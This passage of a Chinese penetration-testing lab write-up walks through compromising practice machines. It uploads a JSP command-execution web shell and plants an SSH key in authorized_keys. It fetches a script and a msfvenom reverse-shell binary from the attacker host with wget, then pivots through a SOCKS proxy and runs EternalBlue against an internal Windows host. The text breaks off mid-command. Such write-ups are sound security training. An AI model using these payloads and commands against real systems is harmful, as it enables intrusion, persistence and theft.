operator\">=</span>ks679custfpe6kzo4fkgc7bu<span class=\"token punctuation\">;</span> phpMyAdmin<span class=\"token operator\">=</span><span class=\"token number\">4</span>ac7b41bd0fe91b11cbe6f602f021a0a<span class=\"token punctuation\">;</span> pma_lang<span class=\"token operator\">=</span>zh_CN<span class=\"token punctuation\">;</span> auto_saved_sql_sort<span class=\"token operator\">=</span>\nConnection<span class=\"token punctuation\">:</span> close\nContent<span class=\"token operator\">-</span>Length<span class=\"token punctuation\">:</span> <span class=\"token number\">752</span>\n\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">%</span>@ page import<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"java.util.*,java.io.*,java.net.*\"</span><span class=\"token operator\">%</span><span class=\"token operator\">></span>\n <span class=\"token operator\">&lt;</span><span class=\"token operator\">%</span>\n <span class=\"token operator\">%</span><span class=\"token operator\">></span>\n <span class=\"token operator\">&lt;</span><span class=\"token constant\">HTML</span><span class=\"token operator\">></span><span class=\"token operator\">&lt;</span><span class=\"token constant\">BODY</span><span class=\"token operator\">></span>\n <span class=\"token operator\">&lt;</span><span class=\"token constant\">FORM</span> <span class=\"token constant\">METHOD</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"POST\"</span> <span class=\"token constant\">NAME</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"myform\"</span> <span class=\"token constant\">ACTION</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"\"</span><span class=\"token operator\">></span>\n <span class=\"token operator\">&lt;</span><span class=\"token constant\">INPUT</span> <span class=\"token constant\">TYPE</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"text\"</span> <span class=\"token constant\">NAME</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"cmd\"</span><span class=\"token operator\">></span>\n <span class=\"token operator\">&lt;</span><span class=\"token constant\">INPUT</span> <span class=\"token constant\">TYPE</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"submit\"</span> <span class=\"token constant\">VALUE</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"Send\"</span><span class=\"token operator\">></span>\n <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span><span class=\"token constant\">FORM</span><span class=\"token operator\">></span>\n <span class=\"token operator\">&lt;</span>pre<span class=\"token operator\">></span>\n <span class=\"token operator\">&lt;</span><span class=\"token operator\">%</span>\n <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>request<span class=\"token operator\">.</span><span class=\"token function\">getParameter</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"cmd\"</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> <span class=\"token constant\">null</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n         out<span class=\"token operator\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Command: \"</span> <span class=\"token operator\">+</span> request<span class=\"token operator\">.</span><span class=\"token function\">getParameter</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"cmd\"</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string double-quoted-string\">\"\\n&lt;BR>\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n         Process p <span class=\"token operator\">=</span> Runtime<span class=\"token operator\">.</span><span class=\"token function\">getRuntime</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token function\">exec</span><span class=\"token punctuation\">(</span>request<span class=\"token operator\">.</span><span class=\"token function\">getParameter</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"cmd\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n         OutputStream os <span class=\"token operator\">=</span> p<span class=\"token operator\">.</span><span class=\"token function\">getOutputStream</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n         InputStream in <span class=\"token operator\">=</span> p<span class=\"token operator\">.</span><span class=\"token function\">getInputStream</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n         DataInputStream dis <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">DataInputStream</span><span class=\"token punctuation\">(</span>in<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n         <span class=\"token keyword type-declaration\">String</span> disr <span class=\"token operator\">=</span> dis<span class=\"token operator\">.</span><span class=\"token function\">readLine</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n         <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span> disr <span class=\"token operator\">!=</span> <span class=\"token constant\">null</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n                 out<span class=\"token operator\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>disr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> disr <span class=\"token operator\">=</span> dis<span class=\"token operator\">.</span><span class=\"token function\">readLine</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">&#125;</span>\n         <span class=\"token punctuation\">&#125;</span>\n <span class=\"token operator\">%</span><span class=\"token operator\">></span>\n <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>pre<span class=\"token operator\">></span>\n <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span><span class=\"token constant\">BODY</span><span class=\"token operator\">></span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span><span class=\"token constant\">HTML</span><span class=\"token operator\">></span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>访问木马文件，接下来执行刚刚的指令</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304111814861.png\" alt=\"image-20230411181436766\"></p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304111815213.png\" alt=\"image-20230411181505159\"></p>\n<p>成功写入</p>\n<p>接下来在kali处生成密钥</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">sh<span class=\"token operator\">-</span>keygen <span class=\"token operator\">-</span>f <span class=\"token function\">qwq</span>  <span class=\"token punctuation\">(</span>我这里输入的密码是Qq123456<span class=\"token punctuation\">)</span>\nchmod <span class=\"token number\">600</span> qwq<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304111816469.png\" alt=\"image-20230411181620358\"></p>\n<p>现在相当于我们可以通过操纵qwq目录，来操纵宿主机的目录，需要将这个秘钥传到宿主机就能ssh登录</p>\n<p>接下来查看用户的隐藏文件</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">ls <span class=\"token operator\">-</span>alh <span class=\"token operator\">/</span>qwq<span class=\"token operator\">/</span>home<span class=\"token operator\">/</span>ubuntu<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304111819387.png\"></p>\n<p>发现ssh，接下来查看kali生成的pub，写一个脚本进行密钥的写入</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">cat qwq<span class=\"token operator\">.</span>pub                                                                                                     <span class=\"token comment\">#ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCzoCdvHtvS1a+14tG+CWt490iwHKIFDnl4LB1PY0S/vPhs0N2NRg0xkhhba29rIZO4r0wrV2R/0voaYmICLNlx1cBkyHO0ik2GW5WGVzUFYtCKqy6LbSqJ2RH+pS8IJW0Ce2Cf57KFIAozBUFdoLqEQs7TJJPAMw839MGNEZApnqkFcaRbVvwYb0BHuRAuUS3rXpTt9y7tQJ74V5kg5a4dQ+BfO3Nxa3gSwbqA2p+3O4FWrw4w07KKzmix5TT2CSSOvcDGWEMg09ByLd1QcGzfga9eVief76hZvUmoE8wjj5M2y7nJ6cut8eQNguebsegcBmXLemtRM22CI89EUmsmkYkgsOOJjaZc5IQKu/BsqW39B4w8nukxpX14ljD6TcxifHe2+iDPuhSGw3cP7qxNQd4/Sus27JWOLrPdlycP/9sTCEqp3yj7znSXWK4Fo5EoFOoKkntPTsYqH/7x6DRA14OOWPG8oRZkU+EWiKOsLbr5sYscAKCwmebFT8heZm0= root@kali</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304111832283.png\" alt=\"image-20230411183246207\"></p>\n<p>接下来写脚本</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">vim key<span class=\"token operator\">.</span>sh\n    \ncp <span class=\"token operator\">-</span>avx <span class=\"token operator\">/</span>qwq<span class=\"token operator\">/</span>home<span class=\"token operator\">/</span>ubuntu<span class=\"token operator\">/</span><span class=\"token operator\">.</span>ssh<span class=\"token operator\">/</span>id_rsa<span class=\"token operator\">.</span>pub <span class=\"token operator\">/</span>qwq<span class=\"token operator\">/</span>home<span class=\"token operator\">/</span>ubuntu<span class=\"token operator\">/</span><span class=\"token operator\">.</span>ssh<span class=\"token operator\">/</span>authorized_keys\n<span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCzoCdvHtvS1a+14tG+CWt490iwHKIFDnl4LB1PY0S/vPhs0N2NRg0xkhhba29rIZO4r0wrV2R/0voaYmICLNlx1cBkyHO0ik2GW5WGVzUFYtCKqy6LbSqJ2RH+pS8IJW0Ce2Cf57KFIAozBUFdoLqEQs7TJJPAMw839MGNEZApnqkFcaRbVvwYb0BHuRAuUS3rXpTt9y7tQJ74V5kg5a4dQ+BfO3Nxa3gSwbqA2p+3O4FWrw4w07KKzmix5TT2CSSOvcDGWEMg09ByLd1QcGzfga9eVief76hZvUmoE8wjj5M2y7nJ6cut8eQNguebsegcBmXLemtRM22CI89EUmsmkYkgsOOJjaZc5IQKu/BsqW39B4w8nukxpX14ljD6TcxifHe2+iDPuhSGw3cP7qxNQd4/Sus27JWOLrPdlycP/9sTCEqp3yj7znSXWK4Fo5EoFOoKkntPTsYqH/7x6DRA14OOWPG8oRZkU+EWiKOsLbr5sYscAKCwmebFT8heZm0= root@kali'</span> <span class=\"token operator\">></span> <span class=\"token operator\">/</span>qwq<span class=\"token operator\">/</span>home<span class=\"token operator\">/</span>ubuntu<span class=\"token operator\">/</span><span class=\"token operator\">.</span>ssh<span class=\"token operator\">/</span>authorized_keys<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>而后开启http服务，使得靶机可以访问到该脚本文件</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">python <span class=\"token operator\">-</span>m SimpleHTTPServer <span class=\"token number\">80</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>在木马文件处执行如下命令</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">wget http<span class=\"token punctuation\">:</span><span class=\"token comment\">//192.168.1.129/key.sh</span>\nchmod <span class=\"token number\">777</span> key<span class=\"token operator\">.</span>sh\n<span class=\"token operator\">.</span><span class=\"token operator\">/</span>key<span class=\"token operator\">.</span>sh\nls <span class=\"token operator\">-</span>alh <span class=\"token operator\">/</span>qwq<span class=\"token operator\">/</span>home<span class=\"token operator\">/</span>ubuntu<span class=\"token operator\">/</span><span class=\"token operator\">.</span>ssh<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304111829012.png\" alt=\"image-20230411182831372\"></p>\n<p>接下来按理说就写入成功了</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">cat <span class=\"token operator\">/</span>qwq<span class=\"token operator\">/</span>home<span class=\"token operator\">/</span>ubuntu<span class=\"token operator\">/</span><span class=\"token operator\">.</span>ssh<span class=\"token operator\">/</span>authorized_keys<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>这个应该可以看到密钥，但我这里并未看到，看一些大师傅给出的原因是密钥设置的过于简短，我刚刚设置的是qwq，小于六位且没大小写，好像是因为这个原因导致的写入密钥失败，但又测试一次过后(设置密码为Qq123456)，仍未看到内容，不知道是啥情况。</p>\n<p>然后正常的话，接下来执行</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">ssh <span class=\"token operator\">-</span>i qwq ubuntu@<span class=\"token number\">192.168</span><span class=\"token number\">.1</span><span class=\"token number\">.130</span> <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>输入我们刚刚设定的密码，就可以实现登录，我这里未复现成功，直接用Ubuntu登录了。</p>\n<h1 id=\"内网\"><a href=\"#内网\" class=\"headerlink\" title=\"内网\"></a>内网</h1><h2 id=\"信息搜集\"><a href=\"#信息搜集\" class=\"headerlink\" title=\"信息搜集\"></a>信息搜集</h2><p><code>ifconfig</code>查看网段</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304111840940.png\" alt=\"image-20230411184055804\"></p>\n<p>两张网卡，<code>192.168.1.139</code>是外网，那么<code>192.168.183.128</code>应该是内网</p>\n<h2 id=\"msf上线\"><a href=\"#msf上线\" class=\"headerlink\" title=\"msf上线\"></a>msf上线</h2><p>接下来同之前docker容器Getshell后msf上线的方法，再对Ubuntu进行一次。首先生成msf木马</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">msfvenom <span class=\"token operator\">-</span>p linux<span class=\"token operator\">/</span>x86<span class=\"token operator\">/</span>meterpreter<span class=\"token operator\">/</span>reverse_tcp <span class=\"token constant\">LHOST</span><span class=\"token operator\">=</span><span class=\"token number\">192.168</span><span class=\"token number\">.1</span><span class=\"token number\">.129</span> <span class=\"token constant\">LPORT</span><span class=\"token operator\">=</span><span class=\"token number\">7777</span> <span class=\"token operator\">-</span>f elf <span class=\"token operator\">></span>shell<span class=\"token operator\">.</span>elf<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>接下来开启http服务，在Ubuntu处用<code>wegt</code>下载木马文件</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">python <span class=\"token operator\">-</span>m SimpleHTTPServer <span class=\"token number\">80</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304112102639.png\" alt=\"image-20230411210208364\"></p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">wget http<span class=\"token punctuation\">:</span><span class=\"token comment\">//192.168.1.129/shell.elf</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304112102307.png\" alt=\"image-20230411210223226\"></p>\n<p>接下来在kali机上开启监听</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">msfconsole\n<span class=\"token keyword\">use</span> <span class=\"token package\">exploit</span><span class=\"token operator\">/</span>multi<span class=\"token operator\">/</span>handler\nset lhost <span class=\"token number\">192.168</span><span class=\"token number\">.1</span><span class=\"token number\">.129</span>\nset lport <span class=\"token number\">7777</span>\nset payload linux<span class=\"token operator\">/</span>x86<span class=\"token operator\">/</span>meterpreter<span class=\"token operator\">/</span>reverse_tcp\nrun<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>然后回到Ubuntu，赋予木马文件执行权限并执行</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">chmod <span class=\"token operator\">+</span>x shell<span class=\"token operator\">.</span>elf\n<span class=\"token operator\">.</span><span class=\"token operator\">/</span>shell<span class=\"token operator\">.</span>elf<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304112103786.png\" alt=\"image-20230411210345754\"></p>\n<p>接下来查看监听处</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304112103779.png\" alt=\"image-20230411210353722\"></p>\n<p>msf成功上线</p>\n<p>顺带探测一下内网机器</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token keyword\">use</span> <span class=\"token package\">auxiliary</span><span class=\"token operator\">/</span>scanner<span class=\"token operator\">/</span>discovery<span class=\"token operator\">/</span>udp_probe\nset <span class=\"token constant\">RHOSTS</span> <span class=\"token number\">192.168</span><span class=\"token number\">.183</span><span class=\"token number\">.0</span><span class=\"token operator\">/</span><span class=\"token number\">24</span>\nset <span class=\"token constant\">THREADS</span> <span class=\"token number\">5</span>\nrun<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304112136299.png\" alt=\"image-20230411213629922\"></p>\n<p>探测出两台内网机器</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token number\">192.168</span><span class=\"token number\">.183</span><span class=\"token number\">.130</span>\n<span class=\"token number\">192.168</span><span class=\"token number\">.183</span><span class=\"token number\">.129</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n\n\n<h2 id=\"添加路由\"><a href=\"#添加路由\" class=\"headerlink\" title=\"添加路由\"></a>添加路由</h2><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">run autoroute <span class=\"token operator\">-</span>s <span class=\"token number\">192.168</span><span class=\"token number\">.183</span><span class=\"token number\">.0</span><span class=\"token operator\">/</span><span class=\"token number\">24</span> <span class=\"token comment\">//添加路由</span>\nrun autoroute <span class=\"token operator\">-</span>p <span class=\"token comment\">//检查是否添加成功</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304112116943.png\" alt=\"image-20230411211622741\"></p>\n<h2 id=\"设置代理\"><a href=\"#设置代理\" class=\"headerlink\" title=\"设置代理\"></a>设置代理</h2><p>利用<code>earthworm</code>建立代理，首先在kali上执行</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token operator\">.</span><span class=\"token operator\">/</span>ew_for_linux64 <span class=\"token operator\">-</span>s rcsocks <span class=\"token operator\">-</span>l <span class=\"token number\">1080</span> <span class=\"token operator\">-</span>e <span class=\"token number\">1234</span>  <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304112130582.png\" alt=\"image-20230411213028468\"></p>\n<p>然后用python服务的方式，将<code>ew_for_linux64</code>上传至Ubuntu，而后执行</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">chmod <span class=\"token operator\">+</span>x ew_for_linux64\n<span class=\"token operator\">.</span><span class=\"token operator\">/</span>ew_for_linux64 <span class=\"token operator\">-</span>s rssocks <span class=\"token operator\">-</span>d <span class=\"token number\">192.168</span><span class=\"token number\">.1</span><span class=\"token number\">.129</span> <span class=\"token operator\">-</span>e <span class=\"token number\">1234</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304112132457.png\" alt=\"image-20230411213228394\"></p>\n<p>接下来ping内网看是否成功</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">ping <span class=\"token number\">192.168</span><span class=\"token number\">.183</span><span class=\"token number\">.130</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304112132551.png\" alt=\"image-20230411213213495\"></p>\n<p>代理设置成功！</p>\n<h2 id=\"横向移动\"><a href=\"#横向移动\" class=\"headerlink\" title=\"横向移动\"></a>横向移动</h2><p>使用nmap对刚刚探测到的两台内网机器进行扫描</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">nmap <span class=\"token operator\">-</span>sS <span class=\"token operator\">-</span>p <span class=\"token number\">1</span><span class=\"token operator\">-</span><span class=\"token number\">65535</span> <span class=\"token operator\">-</span><span class=\"token constant\">A</span> <span class=\"token number\">192.168</span><span class=\"token number\">.183</span><span class=\"token number\">.129</span> <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304112345104.png\" alt=\"image-20230411234522692\"></p>\n<p>开放了445端口，尝试永恒之蓝漏洞</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">msf6 <span class=\"token function\">auxiliary</span><span class=\"token punctuation\">(</span>scanner<span class=\"token operator\">/</span>smb<span class=\"token operator\">/</span>smb_ms17_010<span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> search <span class=\"token constant\">MS17</span><span class=\"token operator\">-</span><span class=\"token number\">010</span>\n\nMatching Modules\n<span class=\"token operator\">===</span><span class=\"token operator\">===</span><span class=\"token operator\">===</span><span class=\"token operator\">===</span><span class=\"token operator\">===</span><span class=\"token operator\">=</span>\n\n   <span class=\"token comment\">#  Name                                           Disclosure Date  Rank     Check  Description</span>\n   <span class=\"token operator\">-</span>  <span class=\"token operator\">--</span><span class=\"token operator\">--</span>                                           <span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">-</span>  <span class=\"token operator\">--</span><span class=\"token operator\">--</span>     <span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">-</span>  <span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">-</span>\n   <span class=\"token number\">0</span>  auxiliary<span class=\"token operator\">/</span>admin<span class=\"token operator\">/</span>smb<span class=\"token operator\">/</span>ms17_010_command           <span class=\"token number\">2017</span><span class=\"token operator\">-</span><span class=\"token number\">03</span><span class=\"token operator\">-</span><span class=\"token number\">14</span>       normal   No     <span class=\"token constant\">MS17</span><span class=\"token operator\">-</span><span class=\"token number\">010</span> EternalRomance<span class=\"token operator\">/</span>EternalSynergy<span class=\"token operator\">/</span>EternalChampion <span class=\"token constant\">SMB</span> Remote Windows Command Execution\n   <span class=\"token number\">1</span>  auxiliary<span class=\"token operator\">/</span>scanner<span class=\"token operator\">/</span>smb<span class=\"token operator\">/</span>smb_ms17_010                              normal   No     <span class=\"token constant\">MS17</span><span class=\"token operator\">-</span><span class=\"token number\">010</span> <span class=\"token constant\">SMB</span> <span class=\"token constant\">RCE</span> Detection\n   <span class=\"token number\">2</span>  exploit<span class=\"token operator\">/</span>windows<span class=\"token operator\">/</span>smb<span class=\"token operator\">/</span>ms17_010_eternalblue       <span class=\"token number\">2017</span><span class=\"token operator\">-</span><span class=\"token number\">03</span><span class=\"token operator\">-</span><span class=\"token number\">14</span>       average  Yes    <span class=\"token constant\">MS17</span><span class=\"token operator\">-</span><span class=\"token number\">010</span> EternalBlue <span class=\"token constant\">SMB</span> Remote Windows Kernel Pool Corruption\n   <span class=\"token number\">3</span>  exploit<span class=\"token operator\">/</span>windows<span class=\"token operator\">/</span>smb<span class=\"token operator\">/</span>ms17_010_eternalblue_win8  <span class=\"token number\">2017</span><span class=\"token operator\">-</span><span class=\"token number\">03</span><span class=\"token operator\">-</span><span class=\"token number\">14</span>       average  No     <span class=\"token constant\">MS17</span><span class=\"token operator\">-</span><span class=\"token number\">010</span> EternalBlue <span class=\"token constant\">SMB</span> Remote Windows Kernel Pool Corruption <span class=\"token keyword\">for</span> Win8<span class=\"token operator\">+</span>\n   <span class=\"token number\">4</span>  exploit<span class=\"token operator\">/</span>windows<span class=\"token operator\">/</span>smb<span class=\"token operator\">/</span>ms17_010_psexec            <span class=\"token number\">2017</span><span class=\"token operator\">-</span><span class=\"token number\">03</span><span class=\"token operator\">-</span><span class=\"token number\">14</span>       normal   Yes    <span class=\"token constant\">MS17</span><span class=\"token operator\">-</span><span class=\"token number\">010</span> EternalRomance<span class=\"token operator\">/</span>EternalSynergy<span class=\"token operator\">/</span>EternalChampion <span class=\"token constant\">SMB</span> Remote Windows Code Execution\n   <span class=\"token number\">5</span>  exploit<span class=\"token operator\">/</span>windows<span class=\"token operator\">/</span>smb<span class=\"token operator\">/</span>smb_doublepulsar_rce       <span class=\"token number\">2017</span><span class=\"token operator\">-</span><span class=\"token number\">04</span><span class=\"token operator\">-</span><span class=\"token number\">14</span>       great    Yes    <span class=\"token constant\">SMB</span> <span class=\"token constant\">DOUBLEPULSAR</span> Remote Code Execution\n\n\nInteract with a module by name <span class=\"token keyword\">or</span> index<span class=\"token operator\">.</span> <span class=\"token keyword\">For</span> example info <span class=\"token number\">5</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">use</span> <span class=\"token number\">5</span> <span class=\"token keyword\">or</span> <span class=\"token keyword\">use</span> <span class=\"token package\">exploit</span><span class=\"token operator\">/</span>windows<span class=\"token operator\">/</span>smb<span class=\"token operator\">/</span>smb_doublepulsar_rce\n\nmsf6 <span class=\"token function\">auxiliary</span><span class=\"token punctuation\">(</span>scanner<span class=\"token operator\">/</span>smb<span class=\"token operator\">/</span>smb_ms17_010<span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> <span class=\"token keyword\">use</span> <span class=\"token number\">2</span>\n<span class=\"token punctuation\">[</span><span class=\"token operator\">*</span><span class=\"token punctuation\">]</span> No payload configured<span class=\"token punctuation\">,</span> defaulting to windows<span class=\"token operator\">/</span>x64<span class=\"token operator\">/</span>meterpreter<span class=\"token operator\">/</span>reverse_tcp\nmsf6 <span class=\"token function\">exploit</span><span class=\"token punctuation\">(</span>windows<span class=\"token operator\">/</span>smb<span class=\"token operator\">/</span>ms17_010_eternalblue<span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> set payload windows<span class=\"token operator\">/</span>x64<span class=\"token operator\">/</span>meterpreter<span class=\"token operator\">/</span>bind_tcp\npayload <span class=\"token operator\">=></span> windows<span class=\"token operator\">/</span>x64<span class=\"token operator\">/</span>meterpreter<span class=\"token operator\">/</span>bind_tcp\nmsf6 <span class=\"token function\">exploit</span><span class=\"token punctuation\">(</span>windows<span class=\"token operator\">/</span>smb<span class=\"token operator\">/</span>ms17_010_eternalblue<span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> set <span class=\"token constant\">RHOSTS</span> <span class=\"token number\">192.168</span><span class=\"token number\">.183</span><span class=\"token number\">.129</span>\n<span class=\"token constant\">RHOSTS</span> <span class=\"token operator\">=></span> <span class=\"token number\">192.168</span><span class=\"token number\">.183</span><span class=\"token number\">.129</span>\nmsf6 <span class=\"token function\">exploit</span><span class=\"token punctuation\">(</span>windows<span class=\"token operator\">/</span>smb<span class=\"token operator\">/</span>ms17_010_eternalblue<span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> run<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304120011513.png\" alt=\"image-20230412001125270\"></p>\n<p>而后就是对域成员的一系列信息搜集</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">ipconfig <span class=\"token operator\">/</span>all   <span class=\"token comment\"># 查看本机ip，所在域</span>\nroute <span class=\"token keyword\">print</span>     <span class=\"token comment\"># 打印路由信息</span>\nnet view        <span class=\"token comment\"># 查看局域网内其他主机名</span>\narp <span class=\"token operator\">-</span>a          <span class=\"token comment\"># 查看arp缓存</span>\nnet start       <span class=\"token comment\"># 查看开启了哪些服务</span>\nnet share       <span class=\"token comment\"># 查看开启了哪些共享</span>\nnet share <span class=\"token class-name type-declaration\">ipc</span>$  <span class=\"token comment\"># 开启ipc共享</span>\nnet share <span class=\"token class-name type-declaration\">c</span>$    <span class=\"token comment\"># 开启c盘共享</span>\nnet <span class=\"token keyword\">use</span> \\\\<span class=\"token number\">192.168</span><span class=\"token operator\">.</span>xx<span class=\"token operator\">.</span><span class=\"token class-name class-name-fully-qualified type-declaration\">xx<span class=\"token punctuation\">\\</span>ipc</span>$ <span class=\"token string double-quoted-string\">\"\"</span> <span class=\"token operator\">/</span>user<span class=\"token punctuation\">:</span><span 